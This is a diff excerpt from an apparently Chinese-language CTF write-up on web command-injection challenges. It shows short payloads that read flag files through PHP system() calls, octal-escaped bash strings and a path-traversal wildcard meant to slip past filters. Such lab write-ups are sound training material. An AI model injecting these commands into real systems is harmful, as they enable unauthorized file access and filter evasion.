@@ -136,12 +136,16 @@ ag
 `cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'`
 ![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781426578446_image.png)
 
-
-
-
-
-
-
+**EZCMD_6**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428526254_image.png)
+`qc=system('cat /flag');`
+**EZCMD_7**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428893597_image.png)
+当前目录没有flag。查找其他目录
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428852223_image.png)
+../../../有flag
+pyload=`?qc=system('cat ../../../fla?');` 
+`fla?` ? 是占位符
 
 
 
